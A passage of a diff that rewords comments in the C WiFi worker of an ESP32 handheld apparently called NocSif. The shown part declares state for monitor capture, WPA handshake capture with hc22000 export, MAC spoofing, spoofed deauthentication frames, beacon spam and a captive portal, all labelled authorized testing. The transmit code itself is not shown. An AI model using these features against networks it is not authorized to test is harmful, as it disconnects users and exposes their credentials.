@@ -1,137 +1,145 @@
 /*
- * NocSif — WiFi (on-SoC 2.4 GHz, STA) worker (M5-P1). See wifi.h.
+ * WiFi (on-SoC 2.4 GHz, station mode) worker implementation (M5-P1). See wifi.h.
  *
- * Architecture (mirrors nfc.cpp / ducky.c):
- *   - A dedicated worker task owns every blocking radio action. The LVGL callbacks only
- *     post a command to the worker's queue (never touch the radio) so LVGL stays single-
- *     threaded and can't stall on association.
- *   - esp_wifi's own event callbacks (STA_START / DISCONNECTED / SCAN_DONE / GOT_IP) run on
- *     the system event task; they publish state and drive the small connection state machine
- *     (connect-on-start, bounded reconnect, fail-fast on an auth failure).
- *   - Bring-up (esp_netif + default event loop + esp_wifi_init/start) is LAZY on the first
- *     enable/scan request and gated on nocsif_reliability_safe_mode(), so boot stays fast and
- *     the coexistence risk (WiFi buffers vs the display-flush DMA path) is isolated to first use.
+ * Architecture, mirroring nfc.cpp / ducky.c:
+ *   - A dedicated worker task owns every blocking radio action. LVGL callbacks
+ *     only ever post a command to the worker's queue and never touch the radio
+ *     directly, so LVGL itself stays single-threaded and can't stall waiting on
+ *     association.
+ *   - esp_wifi's own event callbacks (STA_START, DISCONNECTED, SCAN_DONE,
+ *     GOT_IP) run on the system event task; they publish state and drive a
+ *     small connection state machine (connect-on-start, bounded reconnect,
+ *     fail-fast on an auth failure).
+ *   - Bring-up (esp_netif, the default event loop, esp_wifi_init/start) is lazy,
+ *     happening on the first enable/scan request, and gated on
+ *     nocsif_reliability_safe_mode(), so boot stays fast and any coexistence
+ *     risk (WiFi buffers versus the display-flush DMA path) is confined to
+ *     first use.
  *
- * Coexistence: WiFi/LWIP dynamic buffers are routed to PSRAM (CONFIG_SPIRAM_TRY_ALLOCATE_
- * WIFI_LWIP=y, sdkconfig.defaults) so the radio does not eat the internal DMA RAM the display
- * flush path needs (the documented DMA-hang class). The boot heartbeat logs int-dma free /
- * largest-block for the on-device headroom check.
+ * Coexistence: WiFi/LWIP's dynamic buffers are routed into PSRAM
+ * (CONFIG_SPIRAM_TRY_ALLOCATE_WIFI_LWIP=y in sdkconfig.defaults) so the radio
+ * doesn't eat into the internal DMA RAM the display flush path needs (this is
+ * the documented DMA-hang failure class). The boot heartbeat logs internal-DMA
+ * free/largest-block sizes for the on-device headroom check.
  *
- * Credentials live in the NocSif NVS settings store (not esp_wifi's own NVS — WIFI_STORAGE_RAM),
- * so a working join is re-applied on the next enable and survives a reboot.
+ * Credentials live in the NocSif NVS settings store, not esp_wifi's own NVS
+ * storage (WIFI_STORAGE_RAM is used instead), so a working join gets re-applied
+ * on the next enable and survives a reboot.
  */
 #include "wifi.h"
-#include "ble.h"            /* nocsif_ble_request_release — reclaim the radio from a persistent phone link */
-#include "coex.h"           /* NOCSIF_DMA_CAPS + nocsif_int_dma_largest/_free — shared int-DMA gauge     */
-#include <math.h>           /* cos/sqrt — the §4.6 P3 geo-stamp distance                                  */
-#include "freertos/idf_additions.h" /* xTaskCreateWithCaps / vTaskDeleteWithCaps — PSRAM lazy-worker stacks (A3) */
+#include "ble.h"            /* for nocsif_ble_request_release, to reclaim the radio from a persistent phone link */
+#include "coex.h"           /* for NOCSIF_DMA_CAPS and nocsif_int_dma_largest/_free, the shared internal-DMA gauge */
+#include <math.h>           /* for cos/sqrt, used by the section 4.6 P3 geo-stamp distance calculation */
+#include "freertos/idf_additions.h" /* for xTaskCreateWithCaps / vTaskDeleteWithCaps, the PSRAM lazy-worker stacks (Phase A3) */
 
 #include <stdio.h>
-#include <stdlib.h>   /* atoi (companion /api/brightness|/api/volume), malloc/free, qsort/strtol (P4 browser) */
+#include <stdlib.h>   /* for atoi (companion /api/brightness|/api/volume), malloc/free, qsort/strtol (P4 file browser) */
 #include <string.h>
-#include <strings.h>  /* strcasecmp — §4.8a P4 file browser (sort + MIME by extension) */
-#include <ctype.h>    /* isxdigit — §4.8a P4 query %XX decoding */
+#include <strings.h>  /* for strcasecmp, used by the section 4.8a P4 file browser (sorting and MIME-by-extension) */
+#include <ctype.h>    /* for isxdigit, used by the section 4.8a P4 query %XX decoding */
 
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include "freertos/queue.h"
-#include "freertos/semphr.h"  /* §4.8a P3: mutex guarding the screen-mirror thumbnail buffer */
+#include "freertos/semphr.h"  /* section 4.8a P3: the mutex guarding the screen-mirror thumbnail buffer */
 #include "esp_wifi.h"
 #include "esp_event.h"
 #include "esp_netif.h"
 #include "esp_log.h"
 #include "esp_heap_caps.h"
-#include "esp_mac.h"        /* esp_read_mac (factory STA MAC) */
-#include "esp_random.h"     /* esp_fill_random (MAC spoof)    */
-#include "esp_timer.h"      /* periodic channel hop + rate sampler (monitor mode) */
-#include "esp_http_server.h"/* M5-P5·4 captive-portal HTTP server                 */
-#include "lwip/sockets.h"   /* M5-P5·4 UDP:53 DNS redirector                      */
-#include "mdns.h"           /* §4.8a Companion — nocsif.local responder           */
-#include "cJSON.h"          /* §4.8a Companion P2 — parse POST command bodies      */
+#include "esp_mac.h"        /* for esp_read_mac, the factory station MAC */
+#include "esp_random.h"     /* for esp_fill_random, used by the MAC spoof feature */
+#include "esp_timer.h"      /* the periodic channel-hop and rate sampler used by monitor mode */
+#include "esp_http_server.h"/* the M5-P5.4 captive-portal HTTP server */
+#include "lwip/sockets.h"   /* the M5-P5.4 UDP:53 DNS redirector */
+#include "mdns.h"           /* the section 4.8a companion's nocsif.local mDNS responder */
+#include "cJSON.h"          /* section 4.8a companion P2: parses POST command bodies */
 
-#include "settings.h"       /* nocsif_settings_* (NVS creds) */
-#include "reliability.h"    /* nocsif_reliability_safe_mode */
-#include "sdcard.h"         /* nocsif_sdcard_lock/unlock (PCAP -> /sd) */
-#include "sdfs.h"           /* §4.8a P4 / §4.15: shared /sd jail + claim + listing rules */
-#include "usb_gadget.h"     /* nocsif_usb_gadget_claim_sd (own /sd for PCAP) */
-#include "power.h"          /* nocsif_power_batt_pct (§4.8a companion /api/ping) */
+#include "settings.h"       /* for nocsif_settings_*, the NVS-backed credential store */
+#include "reliability.h"    /* for nocsif_reliability_safe_mode */
+#include "sdcard.h"         /* for nocsif_sdcard_lock/unlock, guarding PCAP writes to /sd */
+#include "sdfs.h"           /* section 4.8a P4 / 4.15: the shared /sd jail plus claim and listing rules */
+#include "usb_gadget.h"     /* for nocsif_usb_gadget_claim_sd, to own /sd for PCAP writes */
+#include "power.h"          /* for nocsif_power_batt_pct, used by the section 4.8a companion's /api/ping */
 
-#include <sys/stat.h>       /* mkdir (PCAP output dir) */
-#include <dirent.h>         /* opendir/readdir — §4.8a P4 companion /sd file browser */
+#include <sys/stat.h>       /* for mkdir, creating the PCAP output directory */
+#include <dirent.h>         /* for opendir/readdir, used by the section 4.8a P4 companion's /sd file browser */
 #include <errno.h>
 
 static const char *TAG = "wifi";
 
-/* ---- tunables --------------------------------------------------------------------- */
-#define WIFI_MAX_AP        20      /* AP rows we keep from a scan (sorted by RSSI)      */
-#define WIFI_MAX_RETRY     5       /* reconnect attempts before giving up on a link     */
-#define WIFI_CMD_QLEN      6       /* worker command queue depth                        */
-#define WIFI_SSID_MAX      33      /* 32 + NUL                                          */
-#define WIFI_PASS_MAX      64      /* WPA2 passphrase max                               */
-#define WIFI_MAX_SAVED     8       /* remembered network profiles                       */
+/* ---- tunables ---- */
+#define WIFI_MAX_AP        20      /* number of AP rows kept from a scan, sorted by RSSI */
+#define WIFI_MAX_RETRY     5       /* reconnect attempts allowed before giving up on a link */
+#define WIFI_CMD_QLEN      6       /* depth of the worker's command queue */
+#define WIFI_SSID_MAX      33      /* 32 characters plus a NUL terminator */
+#define WIFI_PASS_MAX      64      /* the WPA2 passphrase's maximum length */
+#define WIFI_MAX_SAVED     8       /* the number of remembered network profiles */
 
-/* Passive parser (M5-P3): copy-out ring + nearby-AP table. The ring lives in PSRAM (the rx
- * hot path only memcpy's into it; the parser task drains + decodes). CAP_SNAP caps the bytes
- * kept per frame — enough for the mgmt header + the early IEs (SSID / DS / RSN) that identify
- * an AP; the rest is discarded. CAP_SLOTS is the burst depth (slots, power of two). */
-#define CAP_SNAP          256      /* bytes copied per mgmt frame (headers + early IEs)  */
-#define CAP_SNAP_DATA     48       /* bytes copied per data frame (MAC header only)      */
-#define CAP_SLOTS         256      /* ring depth (power of two); ~70 KB PSRAM           */
-#define MON_AP_MAX        32       /* nearby-AP table size (first-seen; stalest evicted) */
-#define MON_STA_MAX       48       /* station table size (first-seen; stalest evicted)   */
-#define MON_PROBE_MAX     48       /* probe-request table size (first-seen; stalest evicted) */
-#define PCAP_SNAP         400      /* bytes captured per frame for PCAP (headers + payload) */
-#define PCAP_SLOTS        128      /* PCAP ring depth (power of two); ~53 KB PSRAM        */
-#define PCAP_RADIOTAP_LEN 13       /* our fixed radiotap header (channel + dBm signal)   */
-#define MON_HS_MAX        32       /* key-exchange table size (BSSID-keyed; stalest evicted) */
+/* Passive parser (M5-P3): the copy-out ring plus the nearby-AP table. The
+ * ring itself lives in PSRAM — the rx hot path only ever memcpy's into it,
+ * while the separate parser task drains and decodes it. CAP_SNAP caps how
+ * many bytes are kept per frame: enough for the management header plus the
+ * early information elements (SSID, DS, RSN) that identify an AP; the rest is
+ * discarded. CAP_SLOTS is the burst depth in slots, kept a power of two. */
+#define CAP_SNAP          256      /* bytes copied per management frame: headers plus early IEs */
+#define CAP_SNAP_DATA     48       /* bytes copied per data frame: just the MAC header */
+#define CAP_SLOTS         256      /* ring depth, a power of two; roughly 70 KB of PSRAM */
+#define MON_AP_MAX        32       /* size of the nearby-AP table; first-seen order, stalest entry evicted */
+#define MON_STA_MAX       48       /* size of the station table; first-seen order, stalest entry evicted */
+#define MON_PROBE_MAX     48       /* size of the probe-request table; first-seen order, stalest entry evicted */
+#define PCAP_SNAP         400      /* bytes captured per frame for PCAP: headers plus payload */
+#define PCAP_SLOTS        128      /* PCAP ring depth, a power of two; roughly 53 KB of PSRAM */
+#define PCAP_RADIOTAP_LEN 13       /* our own fixed radiotap header: channel plus dBm signal */
+#define MON_HS_MAX        32       /* size of the key-exchange table; keyed by BSSID, stalest entry evicted */
 
-/* NVS keys (<= 15 chars, NocSif "nocsif" namespace via the settings store). */
-#define K_SSID      "wifi_ssid"    /* last-connected / auto-join primary (SSID)         */
-#define K_PASS      "wifi_pass"    /* last-connected primary (passphrase)              */
+/* NVS keys, each 15 characters or fewer, under NocSif's "nocsif" namespace via the settings store */
+#define K_SSID      "wifi_ssid"    /* the last-connected / auto-join primary network's SSID */
+#define K_PASS      "wifi_pass"    /* the last-connected primary network's passphrase */
 #define K_AUTOJOIN  "wifi_autojoin"
-#define K_SV_CNT    "wn_n"         /* saved-profile count; per-index keys "wn_s%d"/"wn_p%d" */
-#define K_AP_SSID   "ap_ssid"      /* software-AP config (M5-P5·3): SSID / channel / hidden */
+#define K_SV_CNT    "wn_n"         /* the saved-profile count; per-index keys are "wn_s%d"/"wn_p%d" */
+#define K_AP_SSID   "ap_ssid"      /* software-AP config (M5-P5.3): SSID, channel, hidden flag */
 #define K_AP_CHAN   "ap_chan"
 #define K_AP_HIDDEN "ap_hidden"
-#define K_PT_PAGE   "pt_page"      /* captive-portal landing page filename ("" = built-in notice) */
+#define K_PT_PAGE   "pt_page"      /* the captive portal's landing-page filename; "" selects the built-in notice */
 
-/* ---- worker commands (UI/event task -> worker) ------------------------------------ */
+/* ---- worker commands, sent from the UI/event task to the worker ---- */
 typedef enum {
     CMD_ENABLE, CMD_DISABLE, CMD_SCAN, CMD_CONNECT,
     CMD_DISCONNECT, CMD_FORGET, CMD_SCAN_DONE,
     CMD_RECONNECT, CMD_RANDMAC, CMD_RESTMAC, CMD_APPLY_HOST,
     CMD_CONNECT_SAVED, CMD_FORGET_SSID, CMD_SETMAC,
-    CMD_MONITOR_ON, CMD_MONITOR_OFF, CMD_MON_HOP, CMD_MON_CHAN,   /* M5-P2 monitor */
-    CMD_PARSE_ON, CMD_PARSE_OFF,                                  /* M5-P3 parser  */
-    CMD_PCAP_ON, CMD_PCAP_OFF,                                    /* M5-P3·3 PCAP  */
-    CMD_PCAP_STREAM_ON, CMD_PCAP_STREAM_OFF,                      /* M5-P5+ live-PCAP over USB-CDC */
-    CMD_HS_ON, CMD_HS_OFF,                                        /* M5-P4·1 EAPOL capture */
-    CMD_MGMTTX_ON, CMD_MGMTTX_OFF, CMD_MGMTTX_TARGET,             /* M5-P5·1 management-frame TX */
-    CMD_BEACON_ON, CMD_BEACON_OFF,                              /* M5-P5·2 beacon TX */
+    CMD_MONITOR_ON, CMD_MONITOR_OFF, CMD_MON_HOP, CMD_MON_CHAN,   /* M5-P2 monitor mode */
+    CMD_PARSE_ON, CMD_PARSE_OFF,                                  /* M5-P3 parser */
+    CMD_PCAP_ON, CMD_PCAP_OFF,                                    /* M5-P3.3 PCAP */
+    CMD_PCAP_STREAM_ON, CMD_PCAP_STREAM_OFF,                      /* M5-P5+ live PCAP over USB-CDC */
+    CMD_HS_ON, CMD_HS_OFF,                                        /* M5-P4.1 EAPOL capture */
+    CMD_MGMTTX_ON, CMD_MGMTTX_OFF, CMD_MGMTTX_TARGET,             /* M5-P5.1 management-frame TX */
+    CMD_BEACON_ON, CMD_BEACON_OFF,                              /* M5-P5.2 beacon TX */
     CMD_EXPORT_HC,                                              /* M5 hc22000 export */
-    CMD_AP_ON, CMD_AP_OFF,                                      /* M5-P5·3 software AP */
-    CMD_PORTAL_ON, CMD_PORTAL_OFF, CMD_PORTAL_RELOAD,           /* M5-P5·4 captive portal */
-    CMD_COMPANION_ON, CMD_COMPANION_OFF,                        /* §4.8a companion web remote (L4) */
-    CMD_LEAN_ON, CMD_LEAN_OFF,                                  /* boot-time lean/full buffer profile (BLE coexist) */
-    CMD_GEO_STAMP,                                              /* §4.6 P3: learn the connected network's location */
+    CMD_AP_ON, CMD_AP_OFF,                                      /* M5-P5.3 software AP */
+    CMD_PORTAL_ON, CMD_PORTAL_OFF, CMD_PORTAL_RELOAD,           /* M5-P5.4 captive portal */
+    CMD_COMPANION_ON, CMD_COMPANION_OFF,                        /* section 4.8a companion web remote (L4) */
+    CMD_LEAN_ON, CMD_LEAN_OFF,                                  /* the boot-time lean/full buffer profile choice (BLE coexistence) */
+    CMD_GEO_STAMP,                                              /* section 4.6 P3: learns the connected network's location */
 } wifi_cmd_type_t;
 
 typedef struct {
     wifi_cmd_type_t type;
     char ssid[WIFI_SSID_MAX];
     char pass[WIFI_PASS_MAX];
-    uint8_t mac[6];             /* CMD_SETMAC payload                         */
-    int32_t arg;                /* CMD_MON_HOP (bool) / CMD_MON_CHAN (channel) / CMD_GEO_STAMP lat (µdeg) */
-    int32_t arg2;               /* CMD_GEO_STAMP lon (µdeg)                     */
+    uint8_t mac[6];             /* the CMD_SETMAC payload */
+    int32_t arg;                /* CMD_MON_HOP's bool, CMD_MON_CHAN's channel, or CMD_GEO_STAMP's latitude in micro-degrees */
+    int32_t arg2;               /* CMD_GEO_STAMP's longitude in micro-degrees */
 } wifi_cmd_t;
 
-/* ---- published strings (lock-free double-buffer; writers publish, LVGL reads) ------ */
+/* ---- published strings: a lock-free double buffer, writers publish and LVGL reads ---- */
 static char         s_status[2][24];
 static char         s_detail[2][80];
 static char         s_ip[2][16];
 static char         s_netmask[2][16];
 static char         s_gw[2][16];
-static char         s_mac[2][18];              /* "aa:bb:cc:dd:ee:ff\0"                       */
+static char         s_mac[2][18];              /* "aa:bb:cc:dd:ee:ff\0" */
 static volatile int s_status_i, s_detail_i, s_ip_i, s_netmask_i, s_gw_i, s_mac_i;
 
 static void publish_status(const char *s)  { int n = s_status_i ^ 1;  snprintf(s_status[n], sizeof s_status[n], "%s", s);   s_status_i = n; }
@@ -143,45 +151,48 @@ static void publish_mac_str(const char *s) { int n = s_mac_i ^ 1;     snprintf(s
 
 static void clear_netinfo(void) { publish_ip(""); publish_netmask(""); publish_gw(""); }
 
-/* ---- published scan snapshot (lock-free; a whole buffer is published atomically) --- */
+/* ---- the published scan snapshot: lock-free, a whole buffer is published atomically ---- */
 static nocsif_wifi_ap_t  s_ap[2][WIFI_MAX_AP];
 static int               s_ap_cnt[2];
 static volatile int      s_ap_i;
 static volatile uint32_t s_scan_gen;
-static wifi_ap_record_t  s_recs[WIFI_MAX_AP];   /* worker scratch for record retrieval */
+static wifi_ap_record_t  s_recs[WIFI_MAX_AP];   /* worker-side scratch space used while retrieving scan records */
 
-/* ---- module state ----------------------------------------------------------------- */
+/* ---- module state ---- */
 static TaskHandle_t   s_task;
 static QueueHandle_t  s_q;
 static esp_netif_t   *s_netif;
 static esp_event_handler_instance_t s_h_wifi, s_h_ip;
 
-static bool           s_driver_up;     /* esp_wifi_init done + handlers registered      */
-static bool           s_sta_started;   /* between STA_START and STA_STOP                 */
-static volatile bool  s_enabled;       /* user intent: radio powered on                 */
-static bool           s_want_connect;  /* should hold a link (drives connect-on-start)  */
-static bool           s_pending_scan;  /* a scan was asked before START completed        */
-static volatile bool  s_connected;     /* has an IP                                      */
-static volatile bool  s_scanning;      /* a scan is in flight                            */
-static volatile bool  s_available;     /* mirror of s_driver_up for the C getter         */
-static int            s_retry;         /* reconnect attempts this link                   */
-static bool           s_auth_fail;     /* last drop looked like a bad passphrase          */
-static volatile nocsif_wifi_join_state_t s_join_state;  /* drives the connecting screen   */
+static bool           s_driver_up;     /* esp_wifi_init has run and the event handlers are registered */
+static bool           s_sta_started;   /* true between STA_START and STA_STOP */
+static volatile bool  s_enabled;       /* user intent: whether the radio should be powered on */
+static bool           s_want_connect;  /* whether a link should be held, driving connect-on-start */
+static bool           s_pending_scan;  /* a scan was requested before STA_START completed */
+static volatile bool  s_connected;     /* the station currently has an IP */
+static volatile bool  s_scanning;      /* a scan is currently in flight */
+static volatile bool  s_available;     /* mirrors s_driver_up for the plain-C getter */
+static int            s_retry;         /* reconnect attempts made on this link so far */
+static bool           s_auth_fail;     /* whether the last drop looked like a bad passphrase */
+static volatile nocsif_wifi_join_state_t s_join_state;  /* drives the connecting screen's display */
 
-static char s_ssid[WIFI_SSID_MAX];     /* current target network (RAM cache)             */
+static char s_ssid[WIFI_SSID_MAX];     /* the currently targeted network, cached in RAM */
 static char s_pass[WIFI_PASS_MAX];
 
-/* Remembered network profiles (SSID + passphrase), primed at init and upserted on each join. */
+/* Remembered network profiles (SSID plus passphrase), primed at init and upserted on every successful join. */
 static char s_sv_ssid[WIFI_MAX_SAVED][WIFI_SSID_MAX];
 static char s_sv_pass[WIFI_MAX_SAVED][WIFI_PASS_MAX];
 static int  s_sv_cnt;
-/* §4.6 Governor P3 geo-store — PLACES keyed by BSSID. One SSID can exist in many physical places
- * ("xfinitywifi", a phone hotspot), so a place is an ACCESS POINT (its BSSID) + the location it was last
- * connected from (micro-degrees) + the SSID it belongs to. Auto-learned by CMD_GEO_STAMP when a fresh GNSS
- * fix coincides with a link (the connected AP's BSSID from esp_wifi_sta_get_ap_info); the Governor draws a
- * fence (its radius setting) around each — "near a known AP -> wake WiFi". Persisted as `pl_n` +
- * `pl_b%d` (12 hex) / `pl_s%d` / `pl_la%d` / `pl_lo%d`; oldest evicted when full; forgetting an SSID drops
- * its places. */
+/* Section 4.6 Governor P3 geo-store: places keyed by BSSID. One SSID can
+ * exist at many physical places ("xfinitywifi", a phone hotspot), so a place
+ * is really an access point (its BSSID) plus the location it was last
+ * connected from (in micro-degrees) plus the SSID it belongs to. Auto-learned
+ * by CMD_GEO_STAMP whenever a fresh GNSS fix coincides with a link (using the
+ * connected AP's BSSID from esp_wifi_sta_get_ap_info); the Governor then draws
+ * a fence, sized by its radius setting, around each one — "near a known AP,
+ * so wake WiFi". Persisted as pl_n plus per-index pl_b%d (12 hex digits),
+ * pl_s%d, pl_la%d, pl_lo%d; the oldest is evicted once full, and forgetting an
+ * SSID drops its places too. */
 #define WIFI_MAX_PLACES 8
 typedef struct {
     uint8_t bssid[6];
@@ -190,212 +201,238 @@ typedef struct {
 } wifi_place_t;
 static wifi_place_t s_pl[WIFI_MAX_PLACES];
 static int          s_pl_cnt;
-#define GEO_RESTAMP_M   100.0f      /* re-learn a place only when the new fix is this far from the stored one */
+#define GEO_RESTAMP_M   100.0f      /* only re-learn a place when the new fix is at least this far from the stored one */
 
-/* Lean profile (BLE⇄WiFi coexistence): a BOOT-TIME input. When set, the (one and only) esp_wifi_init
- * uses the small buffer set (see bring_up). main.c arms it before WiFi comes up whenever Bluetooth is
- * on; it is never re-init at runtime (the driver's footprint is fixed at init and a runtime swap would
- * re-fragment the very pool it just freed — RAM-BUDGET.md remake #5/#9). */
+/* The lean profile (BLE/WiFi coexistence) is strictly a boot-time input.
+ * When set, the one and only esp_wifi_init call uses the small buffer set
+ * (see bring_up). main.c arms it before WiFi comes up whenever Bluetooth is
+ * on; it's never re-initialized at runtime, since the driver's memory
+ * footprint is fixed at init time and a runtime swap would just re-fragment
+ * the very pool it had just freed (see RAM-BUDGET.md, remake attempts #5/#9). */
 static volatile bool s_lean;
-static volatile bool s_autojoin = true;     /* auto-reconnect the saved net on enable      */
-static uint8_t       s_mac_factory[6];       /* efuse STA MAC, for "restore default"        */
-static bool          s_mac_factory_ok;       /* s_mac_factory populated                     */
+static volatile bool s_autojoin = true;     /* auto-reconnects the saved network whenever the radio is enabled */
+static uint8_t       s_mac_factory[6];       /* the efuse-programmed station MAC, kept for "restore default" */
+static bool          s_mac_factory_ok;       /* whether s_mac_factory has actually been populated */
 
-/* ---- monitor / promiscuous capture state (M5-P2) ---------------------------------- *
- * A trivial O(1) rx callback tallies volatile counters (single writer, lock-free for the UI
- * readers); an esp_timer hops the channel and samples the 1 Hz frame rate off the LVGL task. */
-static volatile bool      s_mon_active;               /* capture running                    */
-static volatile bool      s_mon_hop = true;           /* hop 1..13 (true) vs lock (false)   */
-static volatile int       s_mon_chan = 1;             /* current / locked channel (1..13)   */
-static bool               s_pending_monitor;          /* asked before STA_START completed   */
-static bool               s_mon_prev_connected;       /* had a live link before capture     */
-static esp_timer_handle_t s_mon_timer;                /* periodic hop + rate sampler        */
-static volatile uint32_t  s_mon_total;                /* all captured frames                */
+/* ---- monitor / promiscuous capture state (M5-P2) ---- *
+ * A trivial O(1) rx callback tallies volatile counters — a single writer,
+ * lock-free for UI readers — while an esp_timer hops the channel and samples
+ * the 1Hz frame rate off the LVGL task. */
+static volatile bool      s_mon_active;               /* capture is running */
+static volatile bool      s_mon_hop = true;           /* hopping across 1..13 (true) versus locked to one channel (false) */
+static volatile int       s_mon_chan = 1;             /* the current or locked channel (1..13) */
+static bool               s_pending_monitor;          /* whether this was requested before STA_START completed */
+static bool               s_mon_prev_connected;       /* whether there was a live link before capture started */
+static esp_timer_handle_t s_mon_timer;                /* the periodic hop-plus-rate-sampler timer */
+static volatile uint32_t  s_mon_total;                /* all frames captured so far */
 static volatile uint32_t  s_mon_by_type[NOCSIF_WIFI_PKT_KINDS];
-static volatile uint32_t  s_mon_ch[14];               /* per-channel tally (index 1..13)    */
-static volatile uint32_t  s_mon_rate;                 /* frames/sec (~1 s window)           */
+static volatile uint32_t  s_mon_ch[14];               /* a per-channel tally, indexed 1..13 */
+static volatile uint32_t  s_mon_rate;                 /* frames per second, over a roughly 1s window */
 static volatile int8_t    s_mon_rssi_last;
 static volatile int8_t    s_mon_rssi_peak;
-static uint32_t           s_mon_rate_base;            /* s_mon_total at the window start    */
-static int64_t            s_mon_rate_t0;              /* window start (esp_timer_get_time)  */
-static volatile uint32_t  s_mon_deauth;               /* deauthentication frames (mgmt subtype 12) */
-static volatile uint32_t  s_mon_disassoc;             /* disassociation frames (mgmt subtype 10)   */
-static volatile uint32_t  s_mon_dd_rate;              /* deauth+disassoc per second (~1 s window)   */
-static volatile uint32_t  s_mon_dd_peak;              /* peak deauth+disassoc per-second rate       */
-static uint32_t           s_mon_dd_base;              /* (deauth+disassoc) at the window start      */
+static uint32_t           s_mon_rate_base;            /* s_mon_total's value at the start of the current window */
+static int64_t            s_mon_rate_t0;              /* the window's start time, from esp_timer_get_time */
+static volatile uint32_t  s_mon_deauth;               /* deauthentication frames, management subtype 12 */
+static volatile uint32_t  s_mon_disassoc;             /* disassociation frames, management subtype 10 */
+static volatile uint32_t  s_mon_dd_rate;              /* combined deauth+disassoc rate per second, over a roughly 1s window */
+static volatile uint32_t  s_mon_dd_peak;              /* the peak combined deauth+disassoc per-second rate seen */
+static uint32_t           s_mon_dd_base;              /* the combined deauth+disassoc count at the window's start */
 
-static void enter_promiscuous(void);   /* installs capture; called on worker or at STA_START */
-static void monitor_teardown(void);    /* stops capture WITHOUT restoring the STA link       */
-static void do_mgmt_tx_off(void);      /* M5-P5·1: stop management-frame TX (used by teardown) */
-static void ap_teardown(void);         /* M5-P5·3: drop the AP to stopped-STA (used by STA entries) */
+static void enter_promiscuous(void);   /* installs capture; called either from the worker or at STA_START */
+static void monitor_teardown(void);    /* stops capture, without restoring the STA link */
+static void do_mgmt_tx_off(void);      /* (M5-P5.1) stops management-frame TX; used during teardown */
+static void ap_teardown(void);         /* (M5-P5.3) drops the AP back to stopped-STA; used by the STA entry points */
 
-/* Management-frame TX state (M5-P5·1, active — authorized testing). A bounded-rate transmitter that
- * emits deauthentication / disassociation frames spoofing a chosen AP (source), to a client or the
- * broadcast address, on an esp_timer while monitor holds the target's channel. Neutral feature. */
+/* Management-frame TX state (M5-P5.1, active — authorized testing). A
+ * bounded-rate transmitter that emits deauthentication or disassociation
+ * frames spoofing a chosen AP as the source, addressed to a specific client
+ * or the broadcast address, on an esp_timer while monitor mode holds the
+ * target's channel. A neutral feature, gated on explicit user action. */
 static volatile bool      s_tx_active;
-static uint8_t            s_tx_bssid[6];               /* target AP (spoofed source)         */
-static uint8_t            s_tx_client[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }; /* dest; FF..=all */
-static uint8_t            s_tx_channel = 1;            /* target home channel                */
-static char               s_tx_ssid[WIFI_SSID_MAX];    /* target SSID (display only)         */
+static uint8_t            s_tx_bssid[6];               /* the target AP, spoofed as the source */
+static uint8_t            s_tx_client[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }; /* the destination; all-FF means everyone */
+static uint8_t            s_tx_channel = 1;            /* the target's home channel */
+static char               s_tx_ssid[WIFI_SSID_MAX];    /* the target's SSID, display only */
 static bool               s_tx_have_target;
-static volatile bool      s_tx_disassoc;               /* false=deauth(12), true=disassoc(10) */
-static volatile uint32_t  s_tx_count;                  /* frames transmitted this session    */
-static volatile uint32_t  s_tx_rate;                   /* frames/sec (~1 s window)           */
+static volatile bool      s_tx_disassoc;               /* false selects deauth (12), true selects disassoc (10) */
+static volatile uint32_t  s_tx_count;                  /* frames transmitted this session */
+static volatile uint32_t  s_tx_rate;                   /* frames per second, over a roughly 1s window */
 static uint32_t           s_tx_rate_base;
 static int64_t            s_tx_rate_t0;
 static esp_timer_handle_t s_tx_timer;
-static bool               s_tx_logged;                 /* logged the first TX result this session */
+static bool               s_tx_logged;                 /* whether the first TX result this session has already been logged */
 
-/* Beacon TX state (M5-P5·2, active — authorized testing). Advertises a user-managed list of SSIDs
- * (add via keyboard, delete/rename/enable per entry; persisted to NVS) by transmitting beacon frames
- * on an esp_timer while the radio holds a channel. Reuses the P5·1 raw-TX override. The list is
- * written by the LVGL task and read by the esp_timer TX loop, so it is guarded by s_bcn_mux. */
-#define BCN_MAX 32                                      /* max SSIDs in the beacon list       */
+/* Beacon TX state (M5-P5.2, active — authorized testing). Advertises a
+ * user-managed list of SSIDs — added via keyboard, deleted/renamed/enabled per
+ * entry, persisted to NVS — by transmitting beacon frames on an esp_timer
+ * while the radio holds a channel. Reuses the P5.1 raw-TX override
+ * underneath. The list itself is written by the LVGL task and read by the
+ * esp_timer's TX loop, so it's guarded by s_bcn_mux. */
+#define BCN_MAX 32                                      /* the maximum number of SSIDs the beacon list can hold */
 typedef struct { char ssid[WIFI_SSID_MAX]; bool en; } bcn_entry_t;
-static void               do_beacon_off(void);          /* fwd (used by monitor_teardown)     */
+static void               do_beacon_off(void);          /* forward declaration, used by monitor_teardown */
 static bcn_entry_t        s_bcn[BCN_MAX];
 static int                s_bcn_cnt;
-static volatile uint32_t  s_bcn_gen;                    /* bumps on any list change (UI rebuild) */
-static bool               s_bcn_loaded;                 /* NVS list loaded once                */
+static volatile uint32_t  s_bcn_gen;                    /* bumps on any list change, triggering a UI rebuild */
+static bool               s_bcn_loaded;                 /* whether the NVS-saved list has been loaded yet */
 static portMUX_TYPE       s_bcn_mux = portMUX_INITIALIZER_UNLOCKED;
 static volatile bool      s_bcn_active;
-static volatile uint32_t  s_bcn_frames;                 /* beacon frames transmitted          */
-static volatile uint32_t  s_bcn_rate;                   /* frames/sec (~1 s window)           */
+static volatile uint32_t  s_bcn_frames;                 /* beacon frames transmitted */
+static volatile uint32_t  s_bcn_rate;                   /* frames per second, over a roughly 1s window */
 static uint32_t           s_bcn_rate_base;
 static int64_t            s_bcn_rate_t0;
 static esp_timer_handle_t s_bcn_timer;
 
-/* Software AP state (M5-P5·3, active — authorized testing). Brings the radio up as an OPEN access
- * point; a periodic esp_timer refreshes the associated-client list (driver association table + the
- * DHCP-server leases for IPs) and publishes it lock-free (double-buffered like the scan snapshot).
- * Config (SSID/channel/hidden) is cached + NVS-persisted, applied on Start. Single radio: AP is
- * exclusive with monitor/STA (do_ap_on suspends them; the STA entry points call do_ap_off). */
-#define AP_CLI_MAX   10                                 /* client rows we track / publish     */
+/* Software AP state (M5-P5.3, active — authorized testing). Brings the
+ * radio up as an open access point; a periodic esp_timer refreshes the
+ * associated-client list — combining the driver's association table with the
+ * DHCP server's leases for IP addresses — and publishes it lock-free, double-
+ * buffered just like the scan snapshot. Config (SSID, channel, hidden) is
